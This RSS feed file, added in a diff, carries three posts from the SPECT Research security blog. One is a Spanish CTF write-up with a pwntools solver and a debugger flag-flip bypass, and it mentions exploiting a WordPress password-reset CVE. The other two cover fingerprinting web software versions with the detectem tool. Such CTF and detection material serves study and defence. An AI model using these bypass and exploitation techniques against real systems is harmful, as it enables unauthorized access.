@@ -1,0 +1,1269 @@
+<rss xmlns:dc="http://purl.org/dc/elements/1.1/" xmlns:content="http://purl.org/rss/1.0/modules/content/" xmlns:atom="http://www.w3.org/2005/Atom" xmlns:media="http://search.yahoo.com/mrss/" version="2.0"><channel><title>SPECT Research</title><description>Security and Software Development</description><link>http://spect.cl/</link><image><url>http://spect.cl/favicon.png</url><title>SPECT Research</title><link>http://spect.cl/</link></image><generator>Ghost 1.16</generator><lastBuildDate>Mon, 30 Oct 2017 17:52:42 GMT</lastBuildDate><atom:link href="http://spect.cl/rss/" rel="self" type="application/rss+xml"/><ttl>60</ttl><item><title>Writeup CTF 8dot8 2017</title><description>&lt;div class="kg-card-markdown"&gt;&lt;p&gt;El pasado Jueves y Viernes se realizó la &lt;a href="https://8dot8.org"&gt;8dot8&lt;/a&gt; en Chile, donde pude participar como charlista y jugar el CTF que finalmente gané. Aquí doy las soluciones a los desafíos que más llamaron mi atención.&lt;/p&gt;
+&lt;h3 id="asciinumbers"&gt;ASCII numbers&lt;/h3&gt;
+&lt;p&gt;El primer desafío de programación era responder correctamente 500 números mostrados en &lt;a href="https://en.wikipedia.org/wiki/ASCII_art"&gt;ASCII&lt;/a&gt;&lt;/p&gt;&lt;/div&gt;</description><link>http://spect.cl/blog/2017/10/writeup-ctf-8dot8-2017/</link><guid isPermaLink="false">59f73867b42ef20001534a5d</guid><dc:creator>Claudio Salazar</dc:creator><pubDate>Mon, 30 Oct 2017 17:15:09 GMT</pubDate><content:encoded>&lt;div class="kg-card-markdown"&gt;&lt;p&gt;El pasado Jueves y Viernes se realizó la &lt;a href="https://8dot8.org"&gt;8dot8&lt;/a&gt; en Chile, donde pude participar como charlista y jugar el CTF que finalmente gané. Aquí doy las soluciones a los desafíos que más llamaron mi atención.&lt;/p&gt;
+&lt;h3 id="asciinumbers"&gt;ASCII numbers&lt;/h3&gt;
+&lt;p&gt;El primer desafío de programación era responder correctamente 500 números mostrados en &lt;a href="https://en.wikipedia.org/wiki/ASCII_art"&gt;ASCII art&lt;/a&gt; a través de un servicio de red. El estilo de estos números me recordó a &lt;a href="https://en.wikipedia.org/wiki/ASCII_art"&gt;FIGlet&lt;/a&gt;, por lo que trate de resolverlo usando ese programa. Los pasos que seguí fueron:&lt;/p&gt;
+&lt;ol&gt;
+&lt;li&gt;Crear la lista de números ASCII usando FIGlet y aplicar una limpieza para eliminar saltos de línea y espacios. Se supone que el índice de la lista corresponde con el número ASCII (&lt;code&gt;numbers[0]&lt;/code&gt; corresponde con el número cero).&lt;/li&gt;
+&lt;li&gt;Basado en la información recibida, si el servidor envía los números y pide una respuesta, empezamos el procesamiento de los números recibidos.&lt;/li&gt;
+&lt;li&gt;La información recibida la separamos por líneas y normalmente los números estarán entre las líneas 1-4, por lo tanto realizamos la misma limpieza que en el punto 1 para poder comparar la existencia de un número. De esa forma armamos nuestra respuesta y la enviamos al servidor.&lt;/li&gt;
+&lt;li&gt;En el caso que no nos pida una respuesta, posiblemente otra información fue recibida y la mostramos por pantalla. Esa información contenía la flag!&lt;/li&gt;
+&lt;/ol&gt;
+&lt;p&gt;Dejo con ustedes el código usado.&lt;/p&gt;
+&lt;pre&gt;&lt;code class="language-language-python"&gt;import re
+import commands
+
+from pwn import remote
+
+
+# 1
+numbers = []
+for i in range(10):
+    number = commands.getoutput('figlet %d' % i)
+    number = re.sub('\n|\s', '', number)
+    numbers.append(number)
+
+r = remote('luckyctf.rtfm-ctf.org', 1337)
+output = r.recv()
+
+while True:
+    output = r.recv()
+    
+    # 2
+    if output.endswith('Answer: '):
+        to_guess = output.split('\n\n')
+
+        # 3
+        rs = ''
+        for i in range(1, 5):
+            n = re.sub('\n|\s', '', to_guess[i])
+
+            for i in range(10):
+                if n == numbers[i]:
+                    rs += '%d' % i
+                    break
+
+        print('.')
+        r.sendline(rs)
+        r.recv()
+    else:
+        # 4
+        print(output)
+        break
+
+r.close()
+&lt;/code&gt;&lt;/pre&gt;
+&lt;h3 id="supereasy"&gt;SuperEasy&lt;/h3&gt;
+&lt;p&gt;Este desafío era un binario para Linux y como su nombre lo dice, era super easy. Se aplicaba el comando &lt;code&gt;strings&lt;/code&gt; sobre el binario lo que arrojaba un curioso string en base64.&lt;/p&gt;
+&lt;pre&gt;&lt;code class="language-language-bash"&gt;$ strings supereasy -n 14                 
+/lib/ld-linux.so.2                        
+__gmon_start__                            
+_IO_stdin_used                            
+__libc_start_main                         
+Entre com a senha para abrir a flag:      
+YzBkMzU3Njk4OTR0NGNrCg==      
+&lt;/code&gt;&lt;/pre&gt;
+&lt;p&gt;Al decifrarlo, daba la flag del desafío (&lt;code&gt;c0d35769894t4ck&lt;/code&gt;).&lt;/p&gt;
+&lt;h3 id="babyrevertme"&gt;BabyRevertMe&lt;/h3&gt;
+&lt;p&gt;El segundo desafío de reversing era un binario en Windows. Lo cargué en IDA y llegué al siguiente punto:&lt;/p&gt;
+&lt;img src="http://cdn.spect.cl/blog/posts/images/baby_revert_me_1.png"&gt;
+&lt;p&gt;Como se puede ver, había una comparación &lt;code&gt;JZ&lt;/code&gt; (Jump Zero) antes de la lógica que imprime la flag. Si se realiza el salto depende del valor del registro &lt;code&gt;ZF&lt;/code&gt;.&lt;/p&gt;
+&lt;p&gt;Ante un input cualquiera, el valor del registro &lt;code&gt;ZF&lt;/code&gt; era &lt;code&gt;1&lt;/code&gt; y el programa salía. La misión era lograr que el registro &lt;code&gt;ZF&lt;/code&gt; fuera &lt;code&gt;0&lt;/code&gt; para imprimir la flag.&lt;/p&gt;
+&lt;p&gt;Pusé un breakpoint en la comparación, cambié el valor de &lt;code&gt;ZF&lt;/code&gt; en el debugger de IDA y puse un breakpoint antes que el programa acabara. Así pude obtener la flag para este desafío.&lt;/p&gt;
+&lt;img src="http://cdn.spect.cl/blog/posts/images/baby_revert_me_2.png"&gt;
+&lt;h3 id="bugpress"&gt;Bugpress&lt;/h3&gt;
+&lt;p&gt;El único desafío web era un servidor que tenía Wordpress. Luego de verificar su versión (&lt;code&gt;4.7.4&lt;/code&gt;), corrí &lt;a href="https://wpscan.org/"&gt;wpscan&lt;/a&gt; para ver si el desafío se trataba de explotar alguna vulnerabilidad en un plugin, pero estaban instalados solo los plugins por defecto.&lt;/p&gt;
+&lt;p&gt;En &lt;a href="https://alertot.com"&gt;alertot&lt;/a&gt; nos consideramos una startup técnica, pero de verdad.  Nuestro CTO ha trabajado para la NASA, yo aporto con el background en desarrollo y seguridad, y mi primo Guillermo es el encargado comercial. En vista de este abanico de posibilidades, ¿quién resolvió este desafío? Guillermo.&lt;/p&gt;
+&lt;p&gt;Después de recordar que a mediados de año me llamó mucho la atención una vulnerabilidad en Wordpress sobre la recuperación de contraseña (&lt;a href="https://exploitbox.io/vuln/WordPress-Exploit-4-7-Unauth-Password-Reset-0day-CVE-2017-8295.html"&gt;Password Reset vulnerability&lt;/a&gt;), se lo comenté y me dijo que él estaba interesado en hacer la explotación. Tomó la información del advisory, creo las condiciones para explotar la vulnerabilidad satisfactoriamente y unas horas después me envió la flag.&lt;/p&gt;
+&lt;img src="http://cdn.spect.cl/blog/posts/images/wordpress_flag.jpg"&gt;&lt;/div&gt;</content:encoded></item><item><title>Introducing detectem</title><description>&lt;div class="kg-card-markdown"&gt;&lt;p&gt;I've created a project named &lt;a href="https://github.com/spectresearch/detectem"&gt;detectem&lt;/a&gt;, trying to solve the issues described in the &lt;a href="http://spect.cl/blog/2016/11/challenges-in-web-software-detection/"&gt;previous post&lt;/a&gt;. Let's review its main strengths and features, as well as the roadmap in the short and long term.&lt;/p&gt;
+&lt;h3 id="technology"&gt;Technology&lt;/h3&gt;
+&lt;p&gt;&lt;a href="https://github.com/spectresearch/detectem"&gt;detectem&lt;/a&gt; is an open-source project written in &lt;em&gt;Python&lt;/em&gt; and powered by &lt;a href="https://github.com/scrapinghub/splash"&gt;Splash&lt;/a&gt;, an open-source project&lt;/p&gt;&lt;/div&gt;</description><link>http://spect.cl/blog/2016/11/introducing-detectem/</link><guid isPermaLink="false">59f734f9aade9a0001902fd7</guid><dc:creator>Claudio Salazar</dc:creator><pubDate>Tue, 15 Nov 2016 20:42:39 GMT</pubDate><content:encoded>&lt;div class="kg-card-markdown"&gt;&lt;p&gt;I've created a project named &lt;a href="https://github.com/spectresearch/detectem"&gt;detectem&lt;/a&gt;, trying to solve the issues described in the &lt;a href="http://spect.cl/blog/2016/11/challenges-in-web-software-detection/"&gt;previous post&lt;/a&gt;. Let's review its main strengths and features, as well as the roadmap in the short and long term.&lt;/p&gt;
+&lt;h3 id="technology"&gt;Technology&lt;/h3&gt;
+&lt;p&gt;&lt;a href="https://github.com/spectresearch/detectem"&gt;detectem&lt;/a&gt; is an open-source project written in &lt;em&gt;Python&lt;/em&gt; and powered by &lt;a href="https://github.com/scrapinghub/splash"&gt;Splash&lt;/a&gt;, an open-source project developed by &lt;a href="https://scrapinghub.com/"&gt;Scrapinghub&lt;/a&gt; to render web pages with a lot of great features, including &lt;em&gt;Javascript&lt;/em&gt; support and a convenient &lt;em&gt;API&lt;/em&gt;.&lt;br&gt;
+&lt;a href="https://github.com/spectresearch/detectem"&gt;detectem&lt;/a&gt; uses &lt;a href="https://github.com/scrapinghub/splash"&gt;Splash&lt;/a&gt; to render the &lt;em&gt;URL&lt;/em&gt; and gets the list of &lt;em&gt;requests/responses&lt;/em&gt; (as a list of &lt;a href="https://en.wikipedia.org/wiki/.har"&gt;HAR&lt;/a&gt; entries) that the browser sent and received to render the page completely.&lt;/p&gt;
+&lt;p&gt;Having the list of requests and responses gives &lt;a href="https://github.com/spectresearch/detectem"&gt;detectem&lt;/a&gt; an incredible power. For instance, most current detectors do regular expressions on response body, then they could fall into false positives. For instance, a page with the following content:&lt;/p&gt;
+&lt;pre&gt;&lt;code class="language-language-html"&gt;&amp;lt;html&amp;gt;
+It's an article about Jquery.
+
+To install, please add to your page:
+
+&amp;lt;xmp&amp;gt;
+&amp;lt;script src=&amp;quot;https://code.jquery.com/jquery-3.1.1.js&amp;quot;&amp;gt;&amp;lt;/script&amp;gt;
+&amp;lt;/xmp&amp;gt;
+
+Then, play!
+&amp;lt;/html&amp;gt;
+&lt;/code&gt;&lt;/pre&gt;
+&lt;p&gt;Both &lt;a href="https://wappalyzer.com/"&gt;Wappalyzer&lt;/a&gt; and &lt;a href="https://www.morningstarsecurity.com/research/whatweb"&gt;WhatWeb&lt;/a&gt; detected &lt;a href="https://jquery.com"&gt;JQuery&lt;/a&gt; incorrectly since it's not used nor loaded by the web page. This kind of issue happens when you do regular expression matches without caring about context (escaped code, comments, etc). However, &lt;a href="https://github.com/spectresearch/detectem"&gt;detectem&lt;/a&gt; had the right behavior because didn't detect &lt;a href="https://jquery.com"&gt;JQuery&lt;/a&gt; since it works a bit different.&lt;/p&gt;
+&lt;h3 id="howitworks"&gt;How it works&lt;/h3&gt;
+&lt;p&gt;&lt;a href="https://github.com/spectresearch/detectem"&gt;detectem&lt;/a&gt; is a command line program that detects web software and its versions. It's based on a system of plugins like &lt;a href="https://www.morningstarsecurity.com/research/whatweb"&gt;WhatWeb&lt;/a&gt; and sets of tests.&lt;/p&gt;
+&lt;pre&gt;&lt;code&gt;$ det http://www.fayerwayer.com
+[('nginx', '1.1.19'), ('jquery', '1.8.3'), ('moment.js', '2.8.2')]
+&lt;/code&gt;&lt;/pre&gt;
+&lt;p&gt;As we see in the &lt;a href="http://spect.cl/blog/2016/11/challenges-in-web-software-detection/"&gt;previous post&lt;/a&gt;, both &lt;a href="https://wappalyzer.com/"&gt;Wappalyzer&lt;/a&gt; and &lt;a href="https://www.morningstarsecurity.com/research/whatweb"&gt;WhatWeb&lt;/a&gt; detected only &lt;a href="https://www.nginx.com/"&gt;Nginx&lt;/a&gt;. &lt;a href="https://github.com/spectresearch/detectem"&gt;detectem&lt;/a&gt; detects more software since has &lt;em&gt;Javascript&lt;/em&gt; support provided by &lt;a href="https://github.com/scrapinghub/splash"&gt;Splash&lt;/a&gt; and currently it has only 4 plugins, 3 of them were identified as present in &lt;a href="https://www.fayerwayer.com"&gt;FayerWayer&lt;/a&gt;.&lt;/p&gt;
+&lt;p&gt;Currently, &lt;a href="https://github.com/spectresearch/detectem"&gt;detectem&lt;/a&gt; supports detection through:&lt;/p&gt;
+&lt;ul&gt;
+&lt;li&gt;Patterns in the URL&lt;/li&gt;
+&lt;li&gt;Patterns in the response body&lt;/li&gt;
+&lt;li&gt;Patterns in headers&lt;/li&gt;
+&lt;/ul&gt;
+&lt;p&gt;It works in a special way to (try to) avoid false positives and be so robust as possible. I'm going to explain why in the previous example both detectors failed and &lt;a href="https://github.com/spectresearch/detectem"&gt;detectem&lt;/a&gt; succeeded.&lt;/p&gt;
+&lt;p&gt;&lt;a href="https://github.com/spectresearch/detectem"&gt;detectem&lt;/a&gt; works on the list of &lt;em&gt;requests/responses&lt;/em&gt;&lt;br&gt;
+made by the browser to render the web page. So in the case of &lt;em&gt;URL matching&lt;/em&gt;, it's applied on the list of requested &lt;em&gt;URLs&lt;/em&gt;. The common case is that libraries requested by the browser are surely loaded in the &lt;em&gt;DOM&lt;/em&gt;, then with a good probability we can say that a library is used by the website. That's the explanation why &lt;a href="https://github.com/spectresearch/detectem"&gt;detectem&lt;/a&gt; didn't fail in the previous example, &lt;a href="https://jquery.com"&gt;JQuery&lt;/a&gt; wasn't in the list of &lt;em&gt;requests/responses&lt;/em&gt;.&lt;/p&gt;
+&lt;p&gt;Patterns in response body are made on the list of responses. For instance, a site using &lt;a href="https://code.jquery.com/jquery-3.1.1.min.js"&gt;Jquery 3.1.1&lt;/a&gt; has a clear signature in its file:&lt;/p&gt;
+&lt;p&gt;&lt;code&gt;/*! jQuery v3.1.1 | (c) jQuery Foundation | jquery.org/license */&lt;/code&gt;&lt;/p&gt;
+&lt;p&gt;We could look for that to assure &lt;a href="https://jquery.com"&gt;JQuery&lt;/a&gt; version. The best thing is it doesn't involve any additional requests since that content is in &lt;em&gt;requests/responses&lt;/em&gt; list if the site uses that library.&lt;/p&gt;
+&lt;p&gt;In the absence of signatures, we can implement hash comparisons as &lt;a href="https://www.morningstarsecurity.com/research/whatweb"&gt;WhatWeb&lt;/a&gt; does. It's in the queue to be implemented.&lt;/p&gt;
+&lt;h3 id="tests"&gt;Tests&lt;/h3&gt;
+&lt;p&gt;For this kind of software you need a strong test suite since a minor change in a matcher could leave sites undetected. For instance, it's the current &lt;a href="https://jquery.com"&gt;JQuery&lt;/a&gt; plugin:&lt;/p&gt;
+&lt;pre&gt;&lt;code class="language-language-python"&gt;
+    matchers = [
+        {'body': '/\*\! jQuery v(?P&amp;lt;version&amp;gt;[0-9\.]+) \| \(c\)'},
+        {'body': '\* jQuery JavaScript Library v(?P&amp;lt;version&amp;gt;[0-9\.]+)'},
+        {'url': '/jquery/(?P&amp;lt;version&amp;gt;[0-9\.]+)/jquery(\.min)?\.js'},
+        {'url': '/jquery-(?P&amp;lt;version&amp;gt;[0-9\.]+)(\.min)?\.js'},
+    ]
+
+&lt;/code&gt;&lt;/pre&gt;
+&lt;p&gt;It uses &lt;em&gt;body&lt;/em&gt; and &lt;em&gt;url&lt;/em&gt; matchers. What happens when the first body matcher doesn't get the version fully but the second one does? If you move the second matcher to the first position, you could break the detection on some sites. How we can do this kind of fixing reliably? Testing our changes against the tests. For &lt;a href="https://jquery.com"&gt;JQuery&lt;/a&gt; plugin these are the tests (&lt;code&gt;tests/plugins/fixtures/jquery.yml&lt;/code&gt;):&lt;/p&gt;
+&lt;pre&gt;&lt;code class="language-language-yaml"&gt;- plugin: jquery
+  matches:
+    - url: http://ajax.googleapis.com/ajax/libs/jquery/1.8.3/jquery.min.js
+      version: 1.8.3
+    - url: https://code.jquery.com/jquery-1.11.3.min.js
+      version: 1.11.3
+    - url: https://code.jquery.com/jquery-1.11.4.js
+      version: 1.11.4
+    - body: /*! jQuery v1.12.4 | (c) jQuery Foundation | jquery.org/license */
+      version: 1.12.4
+    - body: \* jQuery JavaScript Library v1.4.4
+      version: 1.4.4
+&lt;/code&gt;&lt;/pre&gt;
+&lt;p&gt;So if you made a change, then you run the test suite and if every test has passed it's ok.&lt;/p&gt;
+&lt;pre&gt;&lt;code class="language-language-bash"&gt;
+$ py.test tests/plugins/test_generic.py --plugin jquery
+===== test session starts =====
+platform linux -- Python 3.5.2, pytest-3.0.3, py-1.4.31, pluggy-0.4.0
+rootdir: /tmp/detectem, inifile: 
+collected 5 items 
+
+tests/plugins/test_generic.py .....
+
+===== 5 passed in 0.19 seconds =====
+&lt;/code&gt;&lt;/pre&gt;
+&lt;h3 id="contribuiting"&gt;Contribuiting&lt;/h3&gt;
+&lt;p&gt;Adding your own plugin is easy. There are few requirements:&lt;/p&gt;
+&lt;ul&gt;
+&lt;li&gt;Be compliant with &lt;code&gt;detectem.plugin.IPlugin&lt;/code&gt;.&lt;/li&gt;
+&lt;li&gt;Be a subclass of &lt;code&gt;detectem.plugin.Plugin&lt;/code&gt;.&lt;/li&gt;
+&lt;li&gt;As matcher you can use functions or regular expressions with the named parameter &lt;code&gt;version&lt;/code&gt;.&lt;/li&gt;
+&lt;/ul&gt;
+&lt;p&gt;The first is an interface that enforces certain attributes to be mandatory in the plugin. The base class &lt;code&gt;Plugin&lt;/code&gt; has some useful methods to handle plugin data. There are many examples in &lt;code&gt;detectem/plugins&lt;/code&gt; directory.&lt;/p&gt;
+&lt;p&gt;Along with that, to create a valid plugin it's a &lt;strong&gt;must&lt;/strong&gt; to provide a test file to be merged in the master branch. Let's create an example plugin right now to make it clearer. We will save the plugin at &lt;code&gt;detectem/plugins/example.py&lt;/code&gt;.&lt;/p&gt;
+&lt;pre&gt;&lt;code class="language-language-python"&gt;from detectem.plugin import Plugin
+
+
+class ExamplePlugin(Plugin):
+    name = 'example'
+    matchers = [
+       {'url': 'version is v(?P&amp;lt;version&amp;gt;[0-9\.]+)'},
+    ]
+&lt;/code&gt;&lt;/pre&gt;
+&lt;p&gt;Let's add the test file. You have to drop a &lt;a href="http://yaml.org"&gt;YAML&lt;/a&gt; file in &lt;code&gt;tests/plugins/fixtures/&lt;/code&gt; and it will be automatically included in the testing suite. For this case, it will be &lt;code&gt;tests/plugins/fixtures/example.yml&lt;/code&gt;.&lt;/p&gt;
+&lt;pre&gt;&lt;code class="language-language-yaml"&gt;- plugin: example
+  matches:
+    - body: version is v1.1.1
+      version: 1.1.1
+&lt;/code&gt;&lt;/pre&gt;
+&lt;p&gt;Then, it's time to run the tests against the new plugin:&lt;/p&gt;
+&lt;pre&gt;&lt;code&gt;$ py.test tests/plugins/test_generic.py --plugin example
+===== test session starts =====
+platform linux -- Python 3.5.2, pytest-3.0.3, py-1.4.31, pluggy-0.4.0
+rootdir: /tmp/detectem, inifile: 
+plugins: bdd-2.18.1
+collected 1 items 
+
+tests/plugins/test_generic.py .
+
+===== 1 passed in 0.19 seconds =====
+&lt;/code&gt;&lt;/pre&gt;
+&lt;p&gt;The plugin is ready. Of course if the plugin needs more complete tests they can be created in the &lt;code&gt;tests&lt;/code&gt; directory.&lt;/p&gt;
+&lt;h3 id="roadmap"&gt;Roadmap&lt;/h3&gt;
+&lt;p&gt;The main purpose of &lt;a href="https://github.com/spectresearch/detectem"&gt;detectem&lt;/a&gt; is to get the software and its version. In the short-term, there are some ideas to implement:&lt;/p&gt;
+&lt;ol&gt;
+&lt;li&gt;Increment the number of supported plugins, there are good sources to do that.&lt;/li&gt;
+&lt;li&gt;Hash comparisons as in &lt;a href="https://www.morningstarsecurity.com/research/whatweb"&gt;WhatWeb&lt;/a&gt;.&lt;/li&gt;
+&lt;li&gt;Support for special headers in the request.&lt;/li&gt;
+&lt;li&gt;Aggressive mode as in &lt;a href="https://www.morningstarsecurity.com/research/whatweb"&gt;WhatWeb&lt;/a&gt; to get version if it's not available in current &lt;em&gt;requests/responses&lt;/em&gt; (it's not for software discovery)&lt;/li&gt;
+&lt;li&gt;Support of lists of urls.&lt;/li&gt;
+&lt;li&gt;Create the documentation.&lt;/li&gt;
+&lt;/ol&gt;
+&lt;p&gt;In the long-term:&lt;/p&gt;
+&lt;ol&gt;
+&lt;li&gt;Wait that &lt;a href="https://github.com/scrapinghub/splash"&gt;Splash&lt;/a&gt; fixes cache control and move from current creation/destruction of docker container to a constant container (it will speed up &lt;a href="https://github.com/spectresearch/detectem"&gt;detectem&lt;/a&gt; a lot).&lt;/li&gt;
+&lt;li&gt;Research in the field of minifiers.&lt;/li&gt;
+&lt;li&gt;Improved bundle split and single libraries detection.&lt;/li&gt;
+&lt;/ol&gt;
+&lt;p&gt;It's an open source project with &lt;a href="https://opensource.org/licenses/MIT"&gt;MIT License&lt;/a&gt; and you're welcome to contribute, report errors and new features/plugins in the &lt;a href="https://github.com/spectresearch/detectem"&gt;detectem&lt;/a&gt; repository.&lt;/p&gt;
+&lt;/div&gt;</content:encoded></item><item><title>Challenges in Web Software Detection</title><description>&lt;div class="kg-card-markdown"&gt;&lt;p&gt;As web technologies evolve, the same thing should happen with the tools. This post is about the challenges on detecting web software and its versions.&lt;/p&gt;
+&lt;p&gt;I've been an user of &lt;a href="https://www.morningstarsecurity.com/research/whatweb"&gt;WhatWeb&lt;/a&gt; for a long time, even created my own plugins. It has had little activity on its development lastly then&lt;/p&gt;&lt;/div&gt;</description><link>http://spect.cl/blog/2016/11/challenges-in-web-software-detection/</link><guid isPermaLink="false">59f734f9aade9a0001902fd6</guid><category>security</category><category>detectem</category><dc:creator>Claudio Salazar</dc:creator><pubDate>Tue, 15 Nov 2016 20:39:24 GMT</pubDate><content:encoded>&lt;div class="kg-card-markdown"&gt;&lt;p&gt;As web technologies evolve, the same thing should happen with the tools. This post is about the challenges on detecting web software and its versions.&lt;/p&gt;
+&lt;p&gt;I've been an user of &lt;a href="https://www.morningstarsecurity.com/research/whatweb"&gt;WhatWeb&lt;/a&gt; for a long time, even created my own plugins. It has had little activity on its development lastly then I've started to use &lt;a href="https://wappalyzer.com/"&gt;Wappalyzer&lt;/a&gt; but it's passive and lacks some useful features from &lt;a href="https://www.morningstarsecurity.com/research/whatweb"&gt;WhatWeb&lt;/a&gt;. Starting a new project where the software and version detection is essential, I see that current solutions don't fit my requirements but I can take some good ideas from them.&lt;/p&gt;
+&lt;p&gt;I've separated the problem in two parts: first, the challenges detecting software and second, the more complicated issue of detecting the software version. I've named the software which detects web software in a site as &lt;code&gt;detector&lt;/code&gt; in this post.&lt;/p&gt;
+&lt;h2 id="detectingthesoftware"&gt;Detecting the software&lt;/h2&gt;
+&lt;p&gt;In the past, a single request was enough to know what software was running on a site and get almost every library reference. However with the extensive use of &lt;em&gt;Javascript&lt;/em&gt; it has turned more complex to obtain library references with a single request. You have to also see the new scenario with minifiers, bundlers and obfuscators.&lt;/p&gt;
+&lt;p&gt;Nowadays a &lt;em&gt;Javascript&lt;/em&gt; rendering engine is almost a &lt;strong&gt;must&lt;/strong&gt; in a &lt;code&gt;detector&lt;/code&gt;. Without it, you're missing a lot of new sites that use dynamic loading of libraries. Currently, &lt;a href="https://www.morningstarsecurity.com/research/whatweb"&gt;WhatWeb&lt;/a&gt; does a straightforward request without interpreting the &lt;em&gt;Javascript&lt;/em&gt; response. In example, we can see a detection run against &lt;a href="https://www.fayerwayer.com"&gt;Fayerwayer&lt;/a&gt; which is an Angular application:&lt;/p&gt;
+&lt;pre&gt;&lt;code&gt;$ ruby whatweb https://www.fayerwayer.com
+https://www.fayerwayer.com [200] Country[CHILE][CL], HTTPServer[nginx/1.1.19], IP[190.13.66.54], UncommonHeaders[access-control-allow-origin], nginx[1.1.19]
+&lt;/code&gt;&lt;/pre&gt;
+&lt;p&gt;The same happens for &lt;a href="https://wappalyzer.com/"&gt;Wappalyzer&lt;/a&gt; as library.&lt;/p&gt;
+&lt;pre&gt;&lt;code&gt;$ node wapp.js
+{ Nginx: 
+   { app: 'Nginx',
+     confidence: { 'headers Server /nginx(?:\/([\d.]+))?/i': 100 },
+     confidenceTotal: 100,
+     detected: true,
+     excludes: [],
+     version: '1.1.19',
+     versions: [ '1.1.19' ] } }
+&lt;/code&gt;&lt;/pre&gt;
+&lt;p&gt;However, it's also a Firefox and Chrome extension and in those cases it does the detection against the rendered &lt;em&gt;HTML&lt;/em&gt; given by the browser. That way it detects successfully the software on the site.&lt;/p&gt;
+&lt;img src="http://cdn.spect.cl/blog/posts/images/wappalyzer-browser.png"&gt;
+&lt;p&gt;Going deep in the subject, minifiers add an extra layer of complexity. Looking at &lt;a href="https://code.jquery.com/jquery/"&gt;jQuery&lt;/a&gt; releases, it seems simple in some cases since there are key strings (in this case comments) that could help to detect a software, but minifiers like &lt;a href="https://github.com/mishoo/UglifyJS2"&gt;Uglify2&lt;/a&gt; have a lot of options then one source code could generate many different minified files. It's an open area to research.&lt;/p&gt;
+&lt;p&gt;Bundling consists in putting different libraries in just one file. Then having the &lt;code&gt;bundle.js&lt;/code&gt; file it could be easy to detect software by searching for key strings but it could even better to split &lt;code&gt;bundle.js&lt;/code&gt; and be able to do content comparisons at some level (not identical but some algorithm could assist).&lt;/p&gt;
+&lt;p&gt;Obfuscators are even harder to deal but they aren't usually used in web applications (I see them in custom applications but not in widely-used libraries).&lt;/p&gt;
+&lt;h2 id="detectingthesoftwareversion"&gt;Detecting the software version&lt;/h2&gt;
+&lt;p&gt;Let's start detecting the software version using the simplest approach: getting the version from the main response. It's possible through many ways:&lt;/p&gt;
+&lt;ul&gt;
+&lt;li&gt;Some text indicator (&lt;em&gt;i.e.&lt;/em&gt; &lt;code&gt;powered by A version x.x.x&lt;/code&gt;)&lt;/li&gt;
+&lt;li&gt;Some version argument (&lt;em&gt;i.e.&lt;/em&gt; &lt;code&gt;?ver=x.x.x&lt;/code&gt;).&lt;/li&gt;
+&lt;li&gt;The version as part of the path (&lt;em&gt;i.e.&lt;/em&gt; &lt;code&gt;/sw/x.x.x/script.js&lt;/code&gt;).&lt;/li&gt;
+&lt;/ul&gt;
+&lt;p&gt;From our &lt;a href="http://www.espacioculinario.cl/"&gt;example site&lt;/a&gt; we can see that some data could be extracted correctly:&lt;/p&gt;
+&lt;pre&gt;&lt;code class="language-language-javascript"&gt;&amp;lt;script src='http://www.espacioculinario.cl/wp-includes/js/jquery/jquery.js?ver=1.12.4'&amp;gt;&amp;lt;/script&amp;gt;
+&lt;/code&gt;&lt;/pre&gt;
+&lt;p&gt;It uses &lt;em&gt;Jquery&lt;/em&gt; version &lt;code&gt;1.12.4&lt;/code&gt;. That was easy but it's not always the case since:&lt;/p&gt;
+&lt;ol&gt;
+&lt;li&gt;Nowadays we usually don't find text indicators in common frontend libraries.&lt;/li&gt;
+&lt;li&gt;Version argument isn't trustworthy. For instance, in the example site there's a &lt;em&gt;Wordpress&lt;/em&gt; plugin called &lt;a href="https://wordpress.org/plugins/recipe-card/"&gt;recipe-card&lt;/a&gt;.&lt;/li&gt;
+&lt;/ol&gt;
+&lt;pre&gt;&lt;code class="language-language-javascript"&gt;&amp;lt;script src='http://www.espacioculinario.cl/wp-content/plugins/recipe-card/js/post.js?ver=4.6.1'&amp;gt;&amp;lt;/script&amp;gt;
+&lt;/code&gt;&lt;/pre&gt;
+&lt;p&gt;Is its version &lt;code&gt;4.6.1&lt;/code&gt;? According to the plugin homepage, its latest release was &lt;code&gt;1.1.7&lt;/code&gt; but in some installations there's version contamination using the &lt;em&gt;Wordpress&lt;/em&gt; version. Then it's not reliable to extract the version from some parameters like &lt;code&gt;ver&lt;/code&gt;.&lt;/p&gt;
+&lt;p&gt;A good idea from &lt;a href="https://www.morningstarsecurity.com/research/whatweb"&gt;WhatWeb&lt;/a&gt; is that for some plugins it has &lt;code&gt;MD5&lt;/code&gt; comparisons of the library content, then you get the version with a great percent of preciseness. Obviously it involves an additional request to the library URL.&lt;/p&gt;
+&lt;h4 id="tests"&gt;Tests&lt;/h4&gt;
+&lt;p&gt;I've been working for almost five years at &lt;a href="https://scrapinghub.com"&gt;ScrapingHub&lt;/a&gt; in several projects involving web scraping and when you develop this kind of software it's very important to have a good testing suite. Let's take as example the plugin &lt;a href="https://github.com/urbanadventurer/WhatWeb/blob/master/plugins/eserv.rb"&gt;eserv&lt;/a&gt; from &lt;a href="https://www.morningstarsecurity.com/research/whatweb"&gt;WhatWeb&lt;/a&gt;:&lt;/p&gt;
+&lt;pre&gt;&lt;code class="language-language-ruby"&gt;Plugin.define &amp;quot;Eserv&amp;quot; do
+author &amp;quot;Brendan Coles &amp;lt;bcoles@gmail.com&amp;gt;&amp;quot; # 2012-10-22
+version &amp;quot;0.1&amp;quot;
+description &amp;quot;Eserv - Mail Server - SMTP/POP3/IMAP/HTTP&amp;quot;
+website &amp;quot;http://www.eserv.ru/&amp;quot;
+
+matches [
+# Version Detection # HTTP Server Header
+{ :search=&amp;gt;&amp;quot;headers[server]&amp;quot;, :version=&amp;gt;/^Eserv\/([^\s]+)/ },
+
+# Meta Generator # Version Detection
+{ :version=&amp;gt;/&amp;lt;meta name=&amp;quot;generator&amp;quot; content=&amp;quot;Eserv\/([^\s^&amp;quot;]+)&amp;quot; \/&amp;gt;/ },
+
+# Powered by footer # Version Detection
+{ :version=&amp;gt;/&amp;lt;span id='powered_by'&amp;gt;[^&amp;lt;]+&amp;lt;a href=&amp;quot;http:\/\/www\.eserv\.ru\/&amp;quot;&amp;gt;&amp;lt;span itemprop=&amp;quot;name&amp;quot;&amp;gt;Eserv&amp;lt;\/span&amp;gt;&amp;lt;\/a&amp;gt;\/([^\s]+)/ },
+]
+
+end
+&lt;/code&gt;&lt;/pre&gt;
